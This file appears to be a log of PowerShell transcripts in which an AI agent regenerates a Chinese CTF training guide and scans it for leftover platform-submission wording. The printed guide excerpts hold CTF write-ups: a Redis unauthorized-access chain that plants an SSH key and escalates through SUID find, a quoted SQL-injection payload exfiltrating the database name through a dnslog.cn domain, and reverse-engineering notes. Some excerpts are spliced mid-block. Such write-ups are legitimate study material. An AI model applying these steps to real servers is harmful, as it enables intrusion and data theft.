@@ -1,0 +1,845 @@
+**********************
+PowerShell transcript start
+Start time: 20260929204442
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root = 'C:\Users\mzj\Desktop\CTF\玄机刷题'
+$log = Join-Path $root '记录\技术指南去提交过程_20260929.txt'
+Start-Transcript -Path $log -Force | Out-Null
+try {
+    Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force
+    python (Join-Path $root 'tools\reorganize_guide_by_type.py')
+    if ($LASTEXITCODE -ne 0) { throw "指南重构脚本失败，退出码 $LASTEXITCODE" }
+    $md = Join-Path $root '指南\玄机刷题指南_合并源.md'
+    Write-Output '=== 提交、平台状态、界面过程残留扫描 ==='
+    rg -n -i '提交后|平台接受|平台已|平台验证|平台验收|平台反馈|前台.?UI|一血|首血|FLAG 正确|FLAG 不正确|已接受|被拒绝|题目状态|步骤.?1/1|完整 UI 流程|成功 toast|提交核验记录|平台通过的 flag|待平台核验|截图.*工具输出|提交回执|页面返回绿色|截图|前台 PowerShell|浏览器工具|Computer Use|0/1|1/1' $md
+    Write-Output '=== “提交”用例 ==='
+    rg -n '提交' $md
+    Write-Output '=== 平台/UI/过程关键词用例 ==='
+    rg -n '平台|页面|浏览器|FLAG 正确|一血|首血|0/1|1/1|已完成|被拒绝|截图' $md
+}
+finally {
+    Stop-Transcript | Out-Null
+}
+Process ID: 35008
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+=== 提交、平台状态、界面过程残留扫描 ===
+
+=== “提交”用例 ===
+
+=== 平台/UI/过程关键词用例 ===
+
+**********************
+PowerShell transcript end
+End time: 20260929204442
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929204823
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root = 'C:\Users\mzj\Desktop\CTF\玄机刷题'
+$log = Join-Path $root '记录\技术指南去提交过程_20260929.txt'
+Start-Transcript -Path $log -Append | Out-Null
+try {
+    Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force
+    python (Join-Path $root 'tools\reorganize_guide_by_type.py')
+    if ($LASTEXITCODE -ne 0) { throw "指南重构脚本失败，退出码 $LASTEXITCODE" }
+    $md = Join-Path $root '指南\玄机刷题指南_合并源.md'
+    Write-Output '=== 明确平台提交与判定用语扫描 ==='
+    rg -n -i '提交后|提交核验|平台接受|平台已|平台验证|平台验收|平台反馈|前台.?UI|一血|首血|FLAG 正确|FLAG 不正确|已接受|被拒绝|题目状态|步骤.?1/1|完整 UI 流程|成功 toast|提交回执|平台记录明确|平台通过|平台候选|提交.*玄机|玄机.*提交|平台.*ACCEPTED|已完成.*1/1|截图|前台 PowerShell|浏览器工具|Computer Use|0/1|1/1' $md
+    Write-Output '=== 文档结构与标题 ==='
+    rg -n '^#|^\*\*题目信息|^> \*\*零基础知识点' $md
+}
+finally {
+    Stop-Transcript | Out-Null
+}
+Process ID: 37900
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+=== 明确平台提交与判定用语扫描 ===
+
+=== 文档结构与标题 ===
+
+**********************
+PowerShell transcript end
+End time: 20260929204824
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929205228
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force; python (Join-Path $root 'tools\reorganize_guide_by_type.py'); if ($LASTEXITCODE -ne 0) { throw '生成器失败' }; $m=Join-Path $root '指南\玄机刷题指南_合并源.md'; Write-Output '=== 需要人工处理的平台过程残留 ==='; rg -n -i -C 1 '提交后|提交核验|平台接受|平台已|平台验证|平台验收|平台反馈|前台.?UI|一血|首血|FLAG 正确|FLAG 不正确|已接受|被拒绝|题目状态|完整 UI 流程|成功 toast|平台记录明确|平台通过|提交回执|平台回执|截图|前台 PowerShell|浏览器工具|Computer Use|页面短暂跳转|判题通过|玄机.*提交|提交.*玄机|平台.*ACCEPTED|步骤.?1/1|0/1' $m; Write-Output '=== 所有“提交”词上下文 ==='; rg -n -C 1 '提交' $m; Write-Output '=== 新残余与异常标题 ==='; rg -n -i '题目与最终状态|验证状态和限制|结论与验证状态|平台.*接受|平台.*正确|平台.*拒绝|平台.*完成' $m } finally { Stop-Transcript | Out-Null }
+Process ID: 42308
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+=== 需要人工处理的平台过程残留 ===
+
+=== 所有“提交”词上下文 ===
+
+=== 新残余与异常标题 ===
+
+**********************
+PowerShell transcript end
+End time: 20260929205228
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929205340
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force; python (Join-Path $root 'tools\reorganize_guide_by_type.py'); if ($LASTEXITCODE -ne 0) { throw '生成器失败' }; $m=Join-Path $root '指南\玄机刷题指南_合并源.md'; Write-Output '=== platform-verdict scan ==='; rg -n -i '被拒绝|已接受|ACCEPTED|flag.?正确|恭喜你完成|提交后|平台接受|平台验证|平台验收|平台通过|一血|首血|提交回执|平台回执|截图|Computer Use|步骤.?1/1|判题通过' $m; Write-Output '=== submit workflow scan ==='; rg -n -i '提交|平台.*显示|平台.*返回|页面.*步骤|浏览器|前台' $m; Write-Output '=== technical WP samples ==='; Get-Content -LiteralPath $m | Select-Object -Skip 2206 -First 32; Get-Content -LiteralPath $m | Select-Object -Skip 3807 -First 42; Write-Output '=== headings that may describe status/process ==='; rg -n '^#{2,6} .*状态|^#{2,6} .*回执|^#{2,6} .*平台|^#{2,6} .*提交|^#{2,6} .*操作|^#{2,6} .*过程记录|^#{2,6} .*截图' $m } finally { Stop-Transcript | Out-Null }
+Process ID: 30816
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+=== platform-verdict scan ===
+
+=== submit workflow scan ===
+
+=== technical WP samples ===
+5.可见 WSL 启动程序并输入空行，程序打印 ASCII art 与 `This is a fake flag!` 后退出。该信息是程序拒绝输入时的提示，不是 flag，也不表示验证成功。
+6.检查到 WSL 环境没有可用的 gdb；尚未追完反调试/控制流，因此暂停本题并换题。本题的完整解法见下一节“2026-09-27 攻关”。
+
+### 2026-09-27 攻关：程序结构、解密规则
+
+#### 页面与附件复核
+
+题目目标是从附件程序恢复 Flag，并按 `flag{}` 格式组合。附件 ZIP 仅含一个 29,160 字节 ELF64 x86-64 文件 `tradre`，没有独立 flag 或远程地址。
+
+#### 观察程序结构
+
+1. `strings` 找到 `Input your flag:`、`This is a fake flag!`、`Correct flag! Validation passed.` 等字符串，说明错误路径会打印假 flag，不能把该字面量当成答案。
+2. `readelf` 显示入口地址 `0x400910`。入口将 `0x4047cb` 交给 `__libc_start_main`，该函数设置 60 秒 alarm 后 fork。
+3.子进程先调用 `ptrace(PTRACE_TRACEME)`，随后进入 `0x4009f7`；父进程持续 wait/ptrace 观察子进程的断点。主体代码散布大量 `int3`，父进程会在每次陷阱后改写子进程寄存器/栈，再继续执行。
+4.因此不能把所有 `int3` 当普通无操作指令直接跳过。我曾建立仅用于本地实验的 SIGTRAP 处理器，并让其把 RIP 加 1；运行立即触发“非法指令”，证实这种绕过会破坏题目设计的控制流。该失败没有改变原附件。
+5.随后建立 `tradre_ptrace_logger.c`：以 `LD_PRELOAD` 包装 ptrace，但把每次调用继续转交真实 libc ptrace；输出保存到 `题目资料/tradre/分析脚本/tradre_ptrace_trace.log`。输入测试串 `flag{test}` 后程序仍输出 `This is a fake flag!`。日志共 19,813 行，确认正常父子监控路径确实运行；完整原始日志保留为本地分析证据。
+
+#### 公开 Writeup 给出的解密规则
+
+我打开题目页的 Writeup。用户明确允许继续并接受可能失去本题积分后，我才确认进入。Writeup（作者：潍院小手手，标题“菜鸡之笔”，2026-08-17）给出以下规则：
+
+```python
+key = bytes.fromhex("f470bbc031caee5e58b272ea02f3ffe6")
+target = bytes.fromhex(
+    "027532640ce1c1b999349f08b1c457df"
+    "202a5e01b4655cdde3dce131a2e83440"
+    "8b"
+)
+mask = bytes.fromhex(
+    "1acf9382d81f8ef9c605ca4d598fd365"
+    "d9ae3f4cb57c3140fda22c7889497769")
+used_target = target[:16] + target[17:33]
+
+1.连接 6379 检查未授权访问：redis-cli -h <靶场IP> -p 6379 PING 返回 PONG；INFO SERVER 查看版本；CONFIG GET dir 得到 /var/lib/redis。
+2.本地生成 SSH keypair，把公钥以空行包裹后暂存到 Redis 键中，确保 Redis 保存时 authorized_keys 的行格式有效。
+3.将 Redis dir 指向 /var/lib/redis/.ssh，dbfilename 设为 authorized_keys，SAVE 将键内容序列化到 SSH 授权文件。
+4.使用本地私钥 SSH 为 redis 用户登录。通过 find 检查 SUID 程序，公开 Writeup 中的环境存在可用的 SUID find。
+5.借 find -exec 调用 cat /root/flag.txt，读取 root flag。
+
+公开 Writeup 给出的 flag：flag{Redis_RCE_PrivEsc_Success}。来源页：[玄机平台公开 Writeup](https://xj.edisec.net/challenges/442/writeup)。本节明确是公开 Writeup 的步骤整理，并非本机实操记录。
+
+# 安全事件响应
+
+> **本类知识点：** 应急响应题按时间、来源、请求和受影响对象串联证据；解码后的字段要放回原始请求上下文解释。
+
+## 2026CCF-Sql注入的应急排查（ID #450）
+
+**题目信息：** 玄机 ID #450；类型 应急响应；难度 中等。
+
+> **零基础知识点：** 带外（OAST）注入会把查询结果拼进 DNS 或 SMB 名称。URL 解码后要区分数据库名、回连域名和请求路径，并根据 SQL 与 UNC 路径上下文识别目标字段。
+
+### 题目与附件
+
+题面描述企业告警显示大量 SQL 注入扫描，并且数据库服务器有异常 DNS 查询；要求从 Web access.log 中找出攻击者用于接收外带数据的域名。附件 ZIP 内是 access.log，大小 7,429,752 字节，保存于题目资料/Sql注入的应急排查_450/access.log。题目页显示免费、中等、应急响应，flag 格式为 flag{abc.xyz.cn}。
+
+### 筛选唯一带外访问线索
+
+普通日志里多数是被 WAF 拦截的布尔型 SQL 注入尝试。依照题面关于异常 DNS 查询的提示，先用 dns、oast、interactsh、load_file、dnslog、extractvalue、updatexml、concat 等关键词筛选。计数显示 load_file 或 dnslog.cn 命中仅 1 条；第 43271 行来自 203.0.113.88，时间为 20/May/2024 14:02:30 +0800，状态码 200。
+
+将 URL 编码的 query 解码，得到：
+
+    1' AND (SELECT load_file(concat('\\',(select database()),'.p9fin2.dnslog.cn\abc'))) --
+
+load_file 从拼接的 UNC 路径读取资源。数据库名被放到域名标签前，后缀接到题目指定的 DNSLog 域名；数据库服务器若尝试解析该路径，就会触发外部 DNS/SMB 名称解析，攻击者便能从 DNS 请求提取拼接进去的数据。针对该条唯一请求，题目指定的外带接收域名是 p9fin2.dnslog.cn，而不是数据库名或请求路径。
+
+最终 flag：
+
+    flag{p9fin2.dnslog.cn}
+
+### 命令记录与附件
+
+- 原始附件：题目资料/Sql注入的应急排查_450/access.log
+
+## 2026CCF-被入侵的数据库（ID #451）
+=== headings that may describe status/process ===
+
+**********************
+PowerShell transcript end
+End time: 20260929205341
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929205637
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force; python (Join-Path $root 'tools\reorganize_guide_by_type.py'); if ($LASTEXITCODE -ne 0) { throw '生成器失败' }; $m=Join-Path $root '指南\玄机刷题指南_合并源.md'; Write-Output '=== platform submission/verdict and screen-operation residue ==='; rg -n -i '被拒绝|已接受|ACCEPTED|flag.?正确|恭喜你完成|提交后|平台接受|平台验证|平台验收|平台通过|一血|首血|提交回执|平台回执|截图|Computer Use|步骤.?1/1|判题通过|用户明确允许|前台终端查看|前台.*平台|页面总体进度|没有操作平台|页面唯一步骤|步骤提示|选择本题|未启动收费|页面未给出题目简介' $m; Write-Output '=== selected guide slices ==='; Get-Content -LiteralPath $m | Select-Object -Skip 15 -First 20; Get-Content -LiteralPath $m | Select-Object -Skip 2208 -First 37; Get-Content -LiteralPath $m | Select-Object -Skip 3378 -First 24; Get-Content -LiteralPath $m | Select-Object -Skip 3502 -First 22; Write-Output '=== remaining interactive process terms ==='; rg -n -i '页面|平台|前台|浏览器|命令记录|操作记录|过程记录|免费|步骤|完成进度|积分' $m } finally { Stop-Transcript | Out-Null }
+Process ID: 35952
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+=== platform submission/verdict and screen-operation residue ===
+
+=== selected guide slices ===
+
+## 2024铁人三项决赛 CTFRE-crazyaes（ID #81）
+
+**题目信息：** 玄机 ID #81；类型 REVERSE；难度 极难。
+
+> **零基础知识点：** PE 是 Windows 可执行文件格式，UPX 是常见压缩壳。自定义 AES 通常复用标准轮结构但改了顺序或常量，因此要逐项对比标准算法。
+
+### 题目信息与结论
+- 平台：玄机，题目 ID 81
+- 分类 / 难度 / 费用：REVERSE / 极难 / 免费
+- 附件：crazyaes.exe；原始文件 SHA-256：924E14635E4ECA8823EDC8FC7F857A58F1EA1FEEDBE8210B3585E381C968280C
+- 本地验证：候选输入送入修复后静态解包的程序，得到 WOW!!!
+
+- Flag：flag{Re_1ts_f0n}
+
+本题使用本地附件做离线静态逆向。没有把原始附件直接运行；所有头部修复与解包都在工作副本上进行。没有用联网搜索。
+
+### 先建立证据边界
+题目提供 Windows PE 文件。初始字符串看起来像自定义 AES 检查器：程序读取 flag，将 16 字节输入块做变换后与编译进程序的目标常量比较。文件头有损坏迹象，因此先核对原件哈希，再只制作副本供分析。分析过程中将“程序格式修复”“UPX 解包”“算法反推”“本地运行验证”分成独立步骤，避免把解包器误报或错误候选当成答案。
+
+### 2026-09-27 攻关：程序结构、解密规则
+
+#### 附件信息与校验
+
+题目目标是从附件程序恢复 Flag，并按 `flag{}` 格式组合。附件 ZIP 仅含一个 29,160 字节 ELF64 x86-64 文件 `tradre`，没有独立 flag 或远程地址。
+
+#### 观察程序结构
+
+1. `strings` 找到 `Input your flag:`、`This is a fake flag!`、`Correct flag! Validation passed.` 等字符串，说明错误路径会打印假 flag，不能把该字面量当成答案。
+2. `readelf` 显示入口地址 `0x400910`。入口将 `0x4047cb` 交给 `__libc_start_main`，该函数设置 60 秒 alarm 后 fork。
+3.子进程先调用 `ptrace(PTRACE_TRACEME)`，随后进入 `0x4009f7`；父进程持续 wait/ptrace 观察子进程的断点。主体代码散布大量 `int3`，父进程会在每次陷阱后改写子进程寄存器/栈，再继续执行。
+4.因此不能把所有 `int3` 当普通无操作指令直接跳过。我曾建立仅用于本地实验的 SIGTRAP 处理器，并让其把 RIP 加 1；运行立即触发“非法指令”，证实这种绕过会破坏题目设计的控制流。该失败没有改变原附件。
+5.随后建立 `tradre_ptrace_logger.c`：以 `LD_PRELOAD` 包装 ptrace，但把每次调用继续转交真实 libc ptrace；输出保存到 `题目资料/tradre/分析脚本/tradre_ptrace_trace.log`。输入测试串 `flag{test}` 后程序仍输出 `This is a fake flag!`。日志共 19,813 行，确认正常父子监控路径确实运行；完整原始日志保留为本地分析证据。
+
+#### 公开 Writeup 给出的解密规则
+
+我打开题目页的 Writeup。用户明确允许继续并接受可能失去本题积分后，我才确认进入。Writeup（作者：潍院小手手，标题“菜鸡之笔”，2026-08-17）给出以下规则：
+
+```python
+key = bytes.fromhex("f470bbc031caee5e58b272ea02f3ffe6")
+target = bytes.fromhex(
+    "027532640ce1c1b999349f08b1c457df"
+    "202a5e01b4655cdde3dce131a2e83440"
+    "8b"
+)
+mask = bytes.fromhex(
+    "1acf9382d81f8ef9c605ca4d598fd365"
+    "d9ae3f4cb57c3140fda22c7889497769")
+used_target = target[:16] + target[17:33]
+cipher = bytes(a ^ b for a, b in zip(used_target, mask))
+flag_body = AES.new(key, AES.MODE_ECB).decrypt(cipher)
+```
+
+这一步有两个容易遗漏的细节：`target` 一共 33 字节，不是 32 字节；切片先取前 16 字节，再从下标 17 取至 32，故有意跳过下标 16 的单字节 `0x20`，总长重新变为 32 字节。随后逐字节与 32 字节 `mask` XOR，再用 16 字节密钥执行 AES-128-ECB 解密；输出不需要填充。
+
+#### 本地独立复算
+
+
+### 题目信息
+
+- 平台：玄机 https://xj.edisec.net/challenges/583
+- 题名：2026安网杯-像素囚笼1。
+- 分类与难度：MISC、简单；免费题，100 分。
+
+- 附件已由用户解压：`D:\Downloads\像素囚笼附件 (1)\challenge.png`。解压目录只有这一个文件。
+- 在画图中查看到 PNG 图像尺寸 512 × 512 像素，文件约 5.1 KB；资源管理器显示 6 KB（四舍五入显示）。
+
+### 最终 Writeup：ZIP 伪加密标志与直接解压（2026-09-28）
+
+**核心思路更正：** `secret.txt` 根本没有被 ZipCrypto 加密。ZIP 的 local header 与 central directory 中 general-purpose flag bit 0（`flag_bits=0x1`）是伪造的标志位，它让 Bandizip、Python `zipfile` 以及此前所有自写校验程序都先跳过“12 字节加密头”，于是任何口令都不可能解出真正的明文。正确的做法是把偏移 4,996 起的全部 113 字节当作一条 raw DEFLATE 流直接解压。
+
+**逐步推理与复现：**
+
+1.解析 PNG 与 ZIP 边界：ZIP local header 在偏移 4,956；按文件名长度与 extra field 长度计算出数据起始偏移 4,996；关键字段 `method=8`、`compress_size=113`、`file_size=113`、`CRC32=9d13b619`、`flag_bits=0x1`。
+2.取出完整 113 字节载荷，直接调用 `zlib.decompress(data, wbits=-15)` 按 raw DEFLATE 解压，不跳过任何字节。
+3.解压得到 113 字节明文，其 CRC32 为 `9d13b619`，与 local header 和 central directory 完全一致——**流尾标志、长度、CRC 三项互证**，这才是“解出明文”的证据。
+4.反向验证：跳过前 12 字节再解压会报 `invalid block type`；那 12 个字节（`0dc8b10ec2201000d09daf38`）本身就是 DEFLATE 数据的一部分，不是 ZipCrypto 的随机加密头。
+
+解出的明文：
+
+```text
+> **零基础知识点：** PNG 像素由多个颜色通道组成。最低有效位（LSB）隐藏信息时，先依据题目线索选区域和通道，再按位序打包字节。
+
+### 题目信息与结果
+
+- 平台：玄机，挑战 ID 585
+- 分类 / 难度：MISC / 中等
+- 费用：详情页显示“免费”
+- 附件：stamp.png（360×240 RGB PNG）
+
+- Flag：flag{2b250f5b7fcbfba8ce5da68f26aa5483}
+
+本题的关键信息藏在邮戳图像的像素最低位。PNG 的文字注释给出方向：“邮戳是冷色油墨，字在戳面上。”因此重点是区分蓝色印泥和暖色纸面，再在印泥像素中读取蓝色通道最低位。
+
+### 分析步骤
+
+#### 先核对题目条件
+
+在玄机详情页确认标题为“2026安网杯-班次邮戳”，标签为“免费”，难度为“中等”，分类为 MISC。页面没有给出文字题面，仅有附件下载入口。
+
+#### 下载并检查附件
+
+压缩包班次邮戳附件.zip 为 160,365 字节，SHA-256：
+=== remaining interactive process terms ===
+
+**********************
+PowerShell transcript end
+End time: 20260929205638
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929205904
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force; python (Join-Path $root 'tools\reorganize_guide_by_type.py'); if ($LASTEXITCODE -ne 0) { throw '生成器失败' }; $m=Join-Path $root '指南\玄机刷题指南_合并源.md'; Write-Output '=== platform submission/verdict/UI residue ==='; rg -n -i '被拒绝|已接受|ACCEPTED|flag.?正确|恭喜你完成|提交后|平台接受|平台验证|平台验收|平台通过|一血|首血|提交回执|平台回执|截图|Computer Use|步骤.?1/1|判题通过|用户明确允许|前台终端查看|没有操作平台|页面唯一步骤|步骤提示|选择本题|页面未给出题目简介|0/1' $m; Write-Output '=== all remaining “提交” occurrences ==='; rg -n -C 1 '提交' $m; Write-Output '=== remaining platform process narrative ==='; rg -n -i '我打开题目页|用户明确允许|平台提示|页面显示|玄机页面|玄机详情页|详情页显示|页面总体进度|已启动.*环境|确认.*免费|未启动.*收费|平台下载|平台.*记录|平台.*回执|前台操作|浏览器操作' $m; Write-Output '=== output stats / headings ==='; (Get-Item -LiteralPath $m).Length; rg -n '^#' $m | Select-Object -First 15 } finally { Stop-Transcript | Out-Null }
+Process ID: 29364
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+=== platform submission/verdict/UI residue ===
+
+=== all remaining “提交” occurrences ===
+
+=== remaining platform process narrative ===
+
+=== output stats / headings ===
+217711
+13:# 逆向工程（REVERSE）
+17:## 2024铁人三项决赛 CTFRE-crazyaes（ID #81）
+23:### 题目信息与结论
+33:### 先建立证据边界
+44:### 格式识别、PE 头修复与 UPX 解包
+62:### 先从调用链确认输入、目标值和比较规则
+76:### 排除反调试导致的 key 分支差异
+83:### 从 AES 结构逐轮还原自定义变换
+86:#### 密钥扩展
+93:#### 状态变换
+103:#### 轮数顺序
+111:### 逆向解密、候选与独立复算
+134:### 用题目程序作本地验证
+150:### 与证据
+152:### 常见误区与复现资料
+**********************
+PowerShell transcript end
+End time: 20260929205904
+**********************
+**********************
+PowerShell transcript start
+Start time: 20260929210054
+Username: DESKTOP-412KTAR\mzj
+RunAs User: DESKTOP-412KTAR\mzj
+Configuration Name: 
+Machine: DESKTOP-412KTAR (Microsoft Windows NT 10.0.26200.0)
+Host Application: C:\Users\mzj\.cache\codex-runtimes\codex-primary-runtime\dependencies\native\powershell\pwsh.dll -Command try { [Console]::OutputEncoding=[System.Text.Encoding]::UTF8 } catch {}
+$root='C:\Users\mzj\Desktop\CTF\玄机刷题'; $log=Join-Path $root '记录\技术指南去提交过程_20260929.txt'; Start-Transcript -Path $log -Append | Out-Null; try { Copy-Item -LiteralPath (Join-Path $root '记录\玄机刷题指南_合并源_重构前_20260929.md') -Destination (Join-Path $root '指南\玄机刷题指南_合并源.md') -Force; python (Join-Path $root 'tools\reorganize_guide_by_type.py'); if ($LASTEXITCODE -ne 0) { throw '生成器失败' }; $m=Join-Path $root '指南\玄机刷题指南_合并源.md'; Write-Output '=== platform submission/status residue (empty means clean) ==='; rg -n -i '被拒绝|已接受|ACCEPTED|flag.?正确|恭喜你完成|提交后|平台接受|平台验证|平台验收|平台通过|一血|首血|提交回执|平台回执|截图|Computer Use|步骤.?1/1|判题通过|用户明确允许|前台终端查看|没有操作平台|页面唯一步骤|步骤提示|选择本题|页面未给出题目简介|免费题|费用：|0/1|提交' $m; Write-Output '=== UI/process residue ==='; rg -n -i '我打开题目页|平台提示|页面显示|玄机页面|玄机详情页|详情页显示|页面总体进度|未启动.*收费|前台操作|浏览器操作|终端输出均' $m; Write-Output '=== suspicious empty headings/punctuation ==='; rg -n '^#{2,6} .*$|^\s*[。；，,:;]+\s*$|^[-*+]\s*$' $m | Select-Object -First 100; Write-Output '=== stats ==='; (Get-Item -LiteralPath $m).Length; rg -c '^## .*（ID' $m } finally { Stop-Transcript | Out-Null }
+Process ID: 31684
+PSVersion: 7.6.5
+PSEdition: Core
+GitCommitId: 7.6.5
+OS: Microsoft Windows 10.0.26200
+Platform: Win32NT
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1, 6.0, 7.0
+PSRemotingProtocolVersion: 2.4
+SerializationVersion: 1.1.0.1
+WSManStackVersion: 3.0
+**********************
+
+=== platform submission/status residue (empty means clean) ===
+
+=== UI/process residue ===
+
+=== suspicious empty headings/punctuation ===
+17:## 2024铁人三项决赛 CTFRE-crazyaes（ID #81）
+23:### 题目信息与结论
+32:### 先建立证据边界
+43:### 格式识别、PE 头修复与 UPX 解包
+61:### 先从调用链确认输入、目标值和比较规则
+75:### 排除反调试导致的 key 分支差异
+82:### 从 AES 结构逐轮还原自定义变换
+85:#### 密钥扩展
+92:#### 状态变换
+102:#### 轮数顺序
+110:### 逆向解密、候选与独立复算
+133:### 用题目程序作本地验证
+149:### 常见误区与复现资料
+157:## 商丘师范学院第四届网络安全及信息对抗大赛 唧唧复唧唧，木兰当户织（ID #527）
+169:## 商丘师范学院第四届网络安全及信息对抗大赛 即随本心（ID #528）
+308:## 商丘师范学院第四届网络安全及信息对抗大赛 慕然回首，那人却在灯火阑珊处（ID #530）
+408:## 商丘师范学院第四届网络安全及信息对抗大赛 你若安好便是晴（ID #531）
+521:## 商丘师范学院第四届网络安全及信息对抗大赛 往事暗沉不可追（ID #535）
+609:## 商丘师范学院第四届网络安全及信息对抗大赛 遇事不决，可问春风（ID #536）
+690:## 湘岚杯ezbase（ID #537）
+828:## 湘岚杯cryptor（ID #539）
+927:## 湘岚杯maybesignin（ID #540）
+1048:## 第二届 Parloo 杯 RE PaluFlat（ID #547）
+1319:## 第二届 Parloo 杯 PaluGOGOGO（ID #548）
+1513:## 第二届 Parloo 杯 ParlooChecker（ID #549）
+1729:## 第二届 Parloo 杯 PositionalXOR（ID #550）
+1756:## 第二届 Parloo 杯「帕鲁迷宫」（ID #551）
+1787:## 第九届“强网杯”全国网络安全挑战赛 Butterfly（ID #552）
+1930:## 第九届“强网杯”全国网络安全挑战赛 tradre（ID #554）
+1995:## 第三届黄河流域公安院校网络安全技能挑战赛 Victory_Melody（ID #555）
